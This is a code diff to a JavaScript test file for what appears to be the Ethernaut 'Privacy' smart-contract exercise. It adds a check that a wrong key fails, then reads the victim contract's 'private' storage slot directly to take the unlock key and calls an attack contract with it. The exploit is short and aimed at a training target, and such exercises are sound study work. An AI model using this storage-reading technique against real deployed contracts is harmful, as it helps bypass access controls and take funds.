@@ -17,9 +17,18 @@ contract("Privacy", async (accounts) => {
         assert.equal(isLocked, true, "victim not initialized correctly");
     });
 
+    it("attacker should not unlock with the wrong key", async () => {
+        let key = "0xff420ffffffff420fffffff420ffffff"
+
+        await privacyHack.attack(privacy.address, key);
+
+        let isLocked = await privacy.locked.call();
+        assert.equal(isLocked, true, "incorrect key unlocked victim");
+    });
+
     it("attacker should be able to unlock victim", async () => {
         let dataSlot = await web3.eth.getStorageAt(privacy.address, 3)
-        let key = "0x" + dataSlot.substring(2 + (64/2), 2 + 64);
+        let key = "0x" + dataSlot.substring(2 + 0, 2 + 32);
         
         await privacyHack.attack(privacy.address, key);
 
